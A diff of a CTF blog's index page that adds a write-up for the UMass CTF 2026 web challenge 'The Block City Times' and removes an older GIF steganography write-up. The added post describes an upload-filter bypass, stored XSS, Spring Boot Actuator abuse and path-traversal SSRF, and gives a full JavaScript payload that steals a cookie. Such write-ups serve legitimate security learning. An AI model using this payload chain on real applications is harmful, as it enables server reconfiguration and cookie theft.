@@ -235,7 +235,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">257</span>
+          <span class="site-state-item-count">258</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -376,6 +376,146 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umass2026/umassctf2026-the-block-city-times/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/umass2026/umassctf2026-the-block-city-times/" class="post-title-link" itemprop="url">UMass CTF 2026 - The Block City Times</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-04-13 19:53:50 / Modified: 21:01:58" itemprop="dateCreated datePublished" datetime="2026-04-13T19:53:50+08:00">2026-04-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/umass2026/umassctf2026-the-block-city-times/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umass2026/umassctf2026-the-block-city-times/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>The Block City Times is here to inform you!</p>
+</blockquote>
+<h3 id="initial-analysis">Initial Analysis</h3>
+<p>"The Block City Times" is a complex web application built with Spring
+Boot, involving multiple internal services (<code>editorial</code>,
+<code>report-runner</code>) and a Puppeteer-based bot. The challenge
+requires chaining several vulnerabilities to leak a sensitive
+<code>FLAG</code> cookie from an internal diagnostic service.</p>
+<h3 id="solution">Solution</h3>
+<p>The attack follows a multi-stage exploit chain:</p>
+<ol type="1">
+<li><p><strong>Arbitrary File Upload &amp; XSS</strong>: The
+<code>/submit</code> endpoint allows uploading "story" files. Although
+it checks the <code>Content-Type</code>, this is easily bypassed. Files
+are saved with their original extension and served via
+<code>/files/&#123;filename&#125;</code>. By uploading an <code>.html</code> file
+with <code>Content-Type: text/plain</code>, we can achieve stored
+XSS.</p></li>
+<li><p><strong>Administrative Bot Triggering</strong>: The
+<code>editorial</code> service automatically reviews every submission by
+visiting the uploaded file as an administrator. This allows our XSS
+payload to execute with administrative privileges.</p></li>
+<li><p><strong>Actuator Abuse</strong>: The application exposes Spring
+Boot Actuator endpoints. Via XSS, the <code>editorial</code> bot can be
+forced to modify application properties at runtime:</p>
+<ul>
+<li>Disable production enforcement: <code>POST /actuator/env</code> with
+<code>app.enforce-production=false</code>.</li>
+<li>Switch to dev mode: <code>POST /admin/switch?config=dev</code>.</li>
+</ul></li>
+<li><p><strong>SSRF &amp; Cookie Leakage</strong>: The
+<code>report-runner</code> service logs in as an admin, sets a
+<code>FLAG</code> cookie, and visits a user-specified API endpoint.
+While it checks if the endpoint starts with <code>/api/</code>, this can
+be bypassed with path traversal (e.g.,
+<code>/api/../files/exploit.html</code>).</p></li>
+</ol>
+<h4 id="exploit-payload-exploit.html">Exploit Payload
+(<code>exploit.html</code>)</h4>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  (<span class="title function_">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> <span class="title function_">sleep</span> = (<span class="params">ms</span>) =&gt; <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> <span class="built_in">setTimeout</span>(r, ms));</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> filename = location.<span class="property">pathname</span>.<span class="title function_">split</span>(<span class="string">&quot;/&quot;</span>).<span class="title function_">pop</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// STAGE 2: If visited by report-runner, leak the flag to article tags</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">includes</span>(<span class="string">&quot;FLAG=&quot;</span>)) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/api/tags/article/1&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;PUT&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>([<span class="variable language_">document</span>.<span class="property">cookie</span>]),</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// STAGE 1: If visited by editorial bot, reconfigure the app and trigger report</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/actuator/env&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;app.enforce-production&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;false&quot;</span> &#125;),</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/actuator/env&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;app.active-config&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;dev&quot;</span> &#125;),</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/actuator/refresh&quot;</span>, &#123; <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span> &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">2000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> adminPage = <span class="title function_">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/admin&quot;</span>)).<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> csrfToken = adminPage.<span class="title function_">match</span>(<span class="regexp">/name=&quot;_csrf&quot; value=&quot;([^&quot;]+)&quot;/</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>();</span></span><br><span class="line"><span class="language-javascript">      params.<span class="title function_">append</span>(<span class="string">&quot;_csrf&quot;</span>, csrfToken);</span></span><br><span class="line"><span class="language-javascript">      params.<span class="title function_">append</span>(<span class="string">&quot;endpoint&quot;</span>, <span class="string">&quot;/api/../files/&quot;</span> + filename);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/admin/report&quot;</span>, &#123; <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>, <span class="attr">body</span>: params &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>After uploading the exploit (bypassing the extension check by
+modifying the filename to <code>.html</code> in the multipart request),
+the <code>editorial</code> bot triggers the reconfiguration and the
+<code>report-runner</code>. The flag is then leaked to the tags of
+Article 1.</p>
+<h3 id="flag">Flag</h3>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{A_mAn_h3s_f@l13N_1N_tH3_r1v3r}</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1507,126 +1647,6 @@ triangles in the model.</p>
 its interior, we can find the flag model floating in the center.</p>
 <h3 id="flag">Flag</h3>
 <span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{SL1C3_&amp;_D1C3}</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/umass2026/umassctf2026-deep-down/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/umass2026/umassctf2026-deep-down/" class="post-title-link" itemprop="url">UMassCTF 2026 - Deep Down</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-04-13 11:26:01 / Modified: 11:30:29" itemprop="dateCreated datePublished" datetime="2026-04-13T11:26:01+08:00">2026-04-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/umass2026/umassctf2026-deep-down/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/umass2026/umassctf2026-deep-down/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>There's something in the water...</p>
-</blockquote>
-<h3 id="initial-analysis">Initial Analysis</h3>
-<p>The challenge provides a GIF file (<code>CHALL.gif</code>).
-Inspecting the file with standard tools reveals a 12-frame
-animation.</p>
-<ul>
-<li><strong>File Analysis:</strong> Running
-<code>identify -verbose CHALL.gif</code> shows that the image uses an
-8-color Global Color Table (3-bit).</li>
-<li><strong>Palette Anomaly:</strong> The palette contains redundant
-entries for almost identical colors. Specifically, the dark blue color
-of the water <code>(11, 41, 71)</code> is mapped to both <strong>index
-1</strong> and <strong>index 3</strong>.</li>
-</ul>
-<h3 id="solution">Solution</h3>
-<p>In many steganography challenges involving GIFs or indexed PNGs,
-redundant palette indices are used to hide data. I wrote a script to
-isolate these two specific indices by extracting the frames and
-visualizing the pixels.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL.Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x27;P&#x27; 代表 Palette（调色板）模式</span></span><br><span class="line">img = PIL.Image.<span class="built_in">open</span>(<span class="string">&#x27;frame-0.gif&#x27;</span>).convert(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">data = np.array(img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Visualize index 1 as &#x27;#&#x27; and everything else as &#x27;.&#x27;</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    row_str = <span class="string">&quot;&quot;</span>.join([<span class="string">&quot;#&quot;</span> <span class="keyword">if</span> x == <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;.&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data[r]])</span><br><span class="line">    <span class="built_in">print</span>(row_str)</span><br></pre></td></tr></table></figure>
-<p>By printing the pixel grid of the water area and specifically looking
-for the "hidden" index (Index 1 vs Index 3), a clear ASCII art
-representation of the flag appeared:</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.....................................#.....................................................#........</span><br><span class="line">..................................####.....................................................####.....</span><br><span class="line">..................................#...........................................................#.....</span><br><span class="line">..................................#...#..#...#......#####......#####...#.######.######...##...#.....</span><br><span class="line">...#..#.#####.#####.#####.#####...#..##..#...#......#...#......#......##.....#......#...#.#...#.....</span><br><span class="line">...#..#.#.#.#.#...#.#.....#......##.#.#..##..#......#####......#.....#.#.....#......#..#..#...##....</span><br><span class="line">...#..#.#.#.#.#####.###...###...##....#..#.#.#......#...#......#..##...#....#......#..#######..##...</span><br><span class="line">...#..#.#...#.#...#...###...###..##...#..#.#.#......#...#......#..###..#...#......#.......#...##....</span><br><span class="line">...#..#.#...#.#...#.....#.....#...#...#..#..##......#...#......#....#..#...#......#.......#...#.....</span><br><span class="line">...####.#...#.#...#.#####.#####...#..###.#...#.####.#...#.####.######.###..#......#.......#...#.....</span><br><span class="line">..................................#...........................................................#.....</span><br><span class="line">..................................####.....................................................####.....</span><br><span class="line">.....................................#.....................................................#........</span><br></pre></td></tr></table></figure>
-<h3 id="flag">Flag</h3>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{1N_A_G1774}</span></span>
 
       
     </div>
